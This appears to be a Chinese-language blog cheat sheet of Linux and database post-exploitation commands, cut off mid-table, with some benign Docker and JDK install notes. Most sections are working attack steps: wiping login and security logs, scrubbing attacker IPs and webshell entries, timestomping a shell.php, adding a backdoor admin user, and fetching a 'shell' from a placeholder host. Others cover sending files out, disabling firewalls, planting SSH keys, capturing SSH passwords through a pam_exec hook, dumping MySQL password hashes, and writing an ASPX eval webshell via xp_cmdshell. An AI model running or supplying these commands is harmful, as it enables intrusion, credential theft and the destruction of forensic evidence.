<h2 id="常用日志清理"><a href="#常用日志清理" class="headerlink" title="常用日志清理"></a>常用日志清理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /var/log/btmp;echo &gt; /var/log/wtmp;echo &gt; /var/log/lastlog;echo &gt; /var/log/utmp;echo &gt; /var/log/syslog;cat /dev/null &gt; /var/log/secure;cat /dev/null &gt; /var/log/message;echo ok</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;var&#x2F;log&#x2F;btmp 记录所有登录失败信息，使用lastb命令查看</li>
<li>&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</li>
<li>&#x2F;var&#x2F;log&#x2F;wtmp 记录所有用户的登录、注销信息，使用last命令查看</li>
<li>&#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</li>
<li>&#x2F;var&#x2F;log&#x2F;secure 记录与安全相关的日志信息</li>
<li>&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</li>
</ul>
<h2 id="Web-日志清理"><a href="#Web-日志清理" class="headerlink" title="Web 日志清理"></a>Web 日志清理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">直接替换日志ip地址:</span><br><span class="line">sed -i &#x27;s/127.0.0.1/192.168.1.1/g&#x27; access.log</span><br><span class="line"></span><br><span class="line">清除部分相关日志:</span><br><span class="line">使用grep -v来把相关信息删除:</span><br><span class="line">cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"></span><br><span class="line">把修改过的日志覆盖到原日志文件:</span><br><span class="line">cat tmp.log &gt; /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<h2 id="设置终端代理"><a href="#设置终端代理" class="headerlink" title="设置终端代理"></a>设置终端代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure>

<h2 id="查看用户登录记录"><a href="#查看用户登录记录" class="headerlink" title="查看用户登录记录"></a>查看用户登录记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<h2 id="root-权限创建管理员用户"><a href="#root-权限创建管理员用户" class="headerlink" title="root 权限创建管理员用户"></a>root 权限创建管理员用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -m testt &amp;&amp; echo &quot;testt:admin@123&quot; | sudo chpasswd &amp;&amp; sudo usermod -aG wheel testt</span><br></pre></td></tr></table></figure>

<h2 id="cURL-wget-下载文件"><a href="#cURL-wget-下载文件" class="headerlink" title="cURL&#x2F;wget 下载文件"></a>cURL&#x2F;wget 下载文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -P /tmp/ http://x.x.x.x:8080/shell</span><br><span class="line">curl -o /tmp/xxx http://x.x.x.x:8080/shell</span><br></pre></td></tr></table></figure>

<h2 id="curl-wget-发送文件"><a href="#curl-wget-发送文件" class="headerlink" title="curl&#x2F;wget 发送文件"></a>curl&#x2F;wget 发送文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @file.txt http://localhost:9000</span><br><span class="line"></span><br><span class="line">wget --post-file=file.txt http://localhost:9000</span><br><span class="line"></span><br><span class="line">curl -T file.txt http://localhost:9000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def start_server(host, port, buffer_size=1024):</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(5)</span><br><span class="line">    print(f&quot;服务器正在 &#123;host&#125;:&#123;port&#125; 监听...&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        print(f&quot;连接来自 &#123;addr&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 读取HTTP请求头</span><br><span class="line">        request = b&quot;&quot;</span><br><span class="line">        while b&quot;\r\n\r\n&quot; not in request:</span><br><span class="line">            request += client_socket.recv(buffer_size)</span><br><span class="line"></span><br><span class="line">        headers, file_data = request.split(b&quot;\r\n\r\n&quot;, 1)</span><br><span class="line"></span><br><span class="line">        # 提取文件名（可以根据实际需求修改提取方式）</span><br><span class="line">        file_name = &quot;received_file&quot;  # 默认文件名</span><br><span class="line"></span><br><span class="line">        # 保存文件</span><br><span class="line">        with open(file_name, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(file_data)</span><br><span class="line">            while True:</span><br><span class="line">                data = client_socket.recv(buffer_size)</span><br><span class="line">                if not data:</span><br><span class="line">                    break</span><br><span class="line">                f.write(data)</span><br><span class="line"></span><br><span class="line">        print(f&quot;文件 &#123;file_name&#125; 已保存&quot;)</span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    HOST = &#x27;0.0.0.0&#x27;</span><br><span class="line">    PORT = 9000</span><br><span class="line">    start_server(HOST, PORT)</span><br></pre></td></tr></table></figure>

<h2 id="文件时间修改"><a href="#文件时间修改" class="headerlink" title="文件时间修改"></a>文件时间修改</h2><blockquote>
<p>修改 &#x2F;www&#x2F;wwwroot&#x2F;shell.php 时间为 2024.05.16.24</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t 202405161200.24 /www/wwwroot/shell.php</span><br></pre></td></tr></table></figure>

<h2 id="查看-DNS-服务器"><a href="#查看-DNS-服务器" class="headerlink" title="查看 DNS 服务器"></a>查看 DNS 服务器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<h2 id="停止防火墙"><a href="#停止防火墙" class="headerlink" title="停止防火墙"></a>停止防火墙</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">ubuntu:</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>

<h2 id="搜索敏感信息"><a href="#搜索敏感信息" class="headerlink" title="搜索敏感信息"></a>搜索敏感信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config\|.*\.yaml\|.*\.sh|.*\.jsp|.*\.log|.*\.txt|.*\.xml&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=|aliyun|password&quot;</span><br></pre></td></tr></table></figure>

<h2 id="echo-写文件"><a href="#echo-写文件" class="headerlink" title="echo 写文件"></a>echo 写文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//直接 echo 写入：</span><br><span class="line">echo xxx &gt; /www/xxx.jsp</span><br><span class="line"></span><br><span class="line">//base64 写入：</span><br><span class="line">echo eHh4ZGFzMQ== | base64 -d &gt; /www/xxx.jsp</span><br><span class="line"></span><br><span class="line">//追加</span><br><span class="line">echo xxx &gt;&gt; /www/xxx.jsp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在线编码：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/coding.php">https://forum.ywhack.com/coding.php</a></p>
</blockquote>
<h2 id="写入-ssh-公钥："><a href="#写入-ssh-公钥：" class="headerlink" title="写入 ssh 公钥："></a>写入 ssh 公钥：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d &gt; authorized_keys</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//使用  printf 在末尾处插入，如需换行可添加\n</span><br><span class="line">//参考https://baijiahao.baidu.com/s?id=1727019063436737118&amp;wfr=spider&amp;for=pc</span><br><span class="line"></span><br><span class="line">printf &quot;ssh-rsa xxx&quot; &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="压缩打包文件"><a href="#压缩打包文件" class="headerlink" title="压缩打包文件"></a>压缩打包文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//将 /home/mail /home/web 两个目录打包至 /tmp 目录下命名为web.tar.gz</span><br><span class="line">tar czvf /tmp/web.tar.gz /home/mail /home/web</span><br><span class="line"></span><br><span class="line">//zip</span><br><span class="line">zip -r /tmp/web.zip /home/mail /home/web</span><br><span class="line"></span><br><span class="line">//可使用 -x 排除，如:</span><br><span class="line">zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*</span><br></pre></td></tr></table></figure>

<h2 id="分割上传"><a href="#分割上传" class="headerlink" title="分割上传"></a>分割上传</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">split -n 3 fscan  //分割为 3 个文件</span><br><span class="line">split -b 500k fscan  //以 500 K 大小分割 fscan</span><br><span class="line"></span><br><span class="line">Windows 合并：</span><br><span class="line">copy /b xaa+xab fscan</span><br><span class="line">type xaa xab &gt; fscan</span><br><span class="line"></span><br><span class="line">Linux 合并：</span><br><span class="line">cat xaa xab &gt; fscan</span><br></pre></td></tr></table></figure>

<h2 id="十六进制获取文件"><a href="#十六进制获取文件" class="headerlink" title="十六进制获取文件"></a>十六进制获取文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将文件转换为十六进制</span><br><span class="line">xxd -p filename </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 本地还原：</span><br><span class="line">xxd -p -r filename &gt; aa.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="pam-exec-抓-SSH-密码"><a href="#pam-exec-抓-SSH-密码" class="headerlink" title="pam_exec 抓 SSH 密码"></a>pam_exec 抓 SSH 密码</h2><p>需要关闭 SELinux：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 # 关闭</span><br><span class="line">setenforce 1 # 开启</span><br></pre></td></tr></table></figure>

<p>修改 <code>/etc/pam.d/sshd</code>​ 第一行添加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh</span><br></pre></td></tr></table></figure>

<p>&#x2F;tmp&#x2F;sshd.sh:</p>
<blockquote>
<p><code>chmod 777 /tmp/sshd.sh</code>​</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">echo &quot;$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER&quot; &gt;&gt; /tmp/123.log</span><br></pre></td></tr></table></figure>

<h2 id="Debian-Ubuntu-Docker-安装"><a href="#Debian-Ubuntu-Docker-安装" class="headerlink" title="Debian&#x2F;Ubuntu Docker 安装"></a>Debian&#x2F;Ubuntu Docker 安装</h2><blockquote>
<p>Debian 12 &#x2F; Ubuntu 24.04 安装 Docker 以及 Docker Compose</p>
</blockquote>
<p><strong>安装一些必要的软件包</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade -y</span><br><span class="line">apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates</span><br></pre></td></tr></table></figure>

<p><strong>加入 Docker 的 GPG 公钥和 apt 源</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Debian:</span><br><span class="line">curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line">Ubuntu:</span><br><span class="line">curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>国内机器可以用清华 TUNA 的国内源:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Debian:</span><br><span class="line">curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line">Ubuntu:</span><br><span class="line">curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>然后更新系统后即可安装 Docker CE 和 Docker Compose 插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p><strong>安装 Docker Compose</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="JDK-安装"><a href="#JDK-安装" class="headerlink" title="JDK 安装"></a>JDK 安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu18运行</span><br><span class="line">sudo apt install openjdk-11-jre-headless</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">手动</span><br><span class="line">tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz</span><br><span class="line">cd jdk-13.0.2/</span><br><span class="line">pwd</span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">export JAVA_HOME=/root/jdk-13.0.2</span><br><span class="line">export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h2 id="数据库命令速查"><a href="#数据库命令速查" class="headerlink" title="数据库命令速查"></a>数据库命令速查</h2><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="mysql-查连接-IP"><a href="#mysql-查连接-IP" class="headerlink" title="mysql 查连接 IP"></a>mysql 查连接 IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM performance_schema.hosts;</span><br><span class="line">show full processlist;</span><br></pre></td></tr></table></figure>

<h3 id="mysql-查最大数量表"><a href="#mysql-查最大数量表" class="headerlink" title="mysql 查最大数量表"></a>mysql 查最大数量表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name,table_rows,table_schema,table_comment from  information_schema.tables order by table_rows desc;</span><br></pre></td></tr></table></figure>

<h3 id="查询-user-字段在哪个库哪个表"><a href="#查询-user-字段在哪个库哪个表" class="headerlink" title="查询 user 字段在哪个库哪个表"></a>查询 user 字段在哪个库哪个表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    TABLE_SCHEMA AS database_name,</span><br><span class="line">    TABLE_NAME AS table_name,</span><br><span class="line">    COLUMN_NAME AS column_name</span><br><span class="line">FROM </span><br><span class="line">    INFORMATION_SCHEMA.COLUMNS</span><br><span class="line">WHERE </span><br><span class="line">    COLUMN_NAME LIKE &#x27;%user%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="统计访问过的表次数"><a href="#统计访问过的表次数" class="headerlink" title="统计访问过的表次数"></a>统计访问过的表次数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc; </span><br></pre></td></tr></table></figure>

<h3 id="查看写入权限"><a href="#查看写入权限" class="headerlink" title="查看写入权限"></a>查看写入权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | ON    |</span><br><span class="line">| secure_file_priv |          |    可写入</span><br><span class="line">| secure_file_priv | NULL |   不可写入</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>NULL，表示禁止。</li>
<li>如果value值有文件夹目录，则表示只允许该目录下文件，测试子目录也不行。</li>
<li>如果为空，则表示不限制目录。</li>
</ul>
<h3 id="不登录执行-sql"><a href="#不登录执行-sql" class="headerlink" title="不登录执行 sql"></a>不登录执行 sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uaHmin -proot test -e &quot;select now()&quot; -N &gt;H:/work/target1.txt</span><br><span class="line">mysql -uroot -e &quot;show databases;&quot; &gt;1.txt</span><br></pre></td></tr></table></figure>

<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">显示版本: select version();</span><br><span class="line">显示字符集: select @@character_set_database;</span><br><span class="line">显示数据库: show databases;</span><br><span class="line">显示表名: show tables;</span><br><span class="line">显示字段: show columns from table_name;</span><br><span class="line">显示计算机名: select @@hostname;</span><br><span class="line">系统版本: select @@version_compile_os;</span><br><span class="line">mysql路径: select @@basedir;</span><br><span class="line">数据库路径: select @@datadir;</span><br><span class="line">describe describe table_name;</span><br><span class="line">显示root密码: select User,Password from mysql.user;</span><br><span class="line">导入文件: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C);</span><br><span class="line">导出文件: select &#x27;testtest&#x27; into outfile &#x27;/var/www/html/test.txt&#x27; from mysql.user;</span><br><span class="line">开启外连: GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;</span><br><span class="line">mysql安装路径: show variables;   </span><br><span class="line">更新数据库: UPDATE `DX15`.`dx15_common_member` SET `uid` = &#x27;1&#x27; WHERE `dx15_common_member`.`uid` =40407;更新40407uid变成uid1</span><br><span class="line">mysql更改root密码: mysqladmin -u root password &quot;newpwd&quot;;</span><br><span class="line">查询表: select concat(User,0x3a,Password) from mysql.user; </span><br><span class="line">获取数据库所有表: SHOW TABLES FROM `databases`;</span><br><span class="line">获取列前20行: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20;</span><br><span class="line">获取表行数: SELECT COUNT(*) AS CNT FROM `dede_admin`;</span><br></pre></td></tr></table></figure>

<h2 id="sql-server"><a href="#sql-server" class="headerlink" title="sql server"></a>sql server</h2><p>相关工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURVVA==">MDUT</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1NoYXJwU1FMVG9vbHM=">SharpSQLTools</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL1N5U1MtUmVzZWFyY2gvTUFU">MAT</a></li>
</ul>
<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote>
<p>SQL Server 2005 之前版本，xp_cmdshell 默认开启:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>判断是否存在 xp_cmdshell 存储过程，返回1表示存在，否则表示不存在:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除 xp_cmdshell:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..sp_dropextendedproc xp_cmdshell;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>恢复 xp_cmdshell:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_dropextendedproc xp_cmdshell,@dllname=&#x27;xplog70.dll&#x27; declare @o int;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>SQL Server 2005之后的版本中，xp_cmdshell 默认关闭，需要手动开启，开启xp_cmdshell需要sa权限:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 允许修改高级参数</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line"># 配置生效</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 开启xp_cmdshell</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line"># 配置生效</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 检查是否开启</span><br><span class="line">exec sp_configure;</span><br><span class="line"># 执行系统命令</span><br><span class="line">exec master..xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line"># 获取webshell</span><br><span class="line">exec master..xp_cmdshell &#x27;echo  ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\test.aspx&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-默认数据库"><a href="#MSSQL-默认数据库" class="headerlink" title="MSSQL 默认数据库"></a>MSSQL 默认数据库</h3><table>
<thead>
<tr>
<th>Name</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>pubs</td>
<td>在 MSSQL 2005 中不可用</td>
</tr>
<tr>
<td>model</td>
<td>在所有版本中可用</td>
</tr>
<tr>
<td>msdb</td>
<td>在所有版本中可用</td>
</tr>
<tr>
<td>tempdb</td>
<td>在所有版本中可用</td>
</tr>
<tr>
<td>northwind</td>
<td>在所有版本中可用</td>
</tr>
<tr>
<td>information_schema</td>
<td>从 MSSQL 2000 及更高版本开始可用</td>
</tr>
</tbody></table>
<h3 id="MSSQL-注释"><a href="#MSSQL-注释" class="headerlink" title="MSSQL 注释"></a>MSSQL 注释</h3><table>
<thead>
<tr>
<th>Type</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>​<code>/* MSSQL Comment */</code>​</td>
<td>C-style 注释</td>
</tr>
<tr>
<td>​<code>-- -</code>​</td>
<td>SQL 注释</td>
</tr>
<tr>
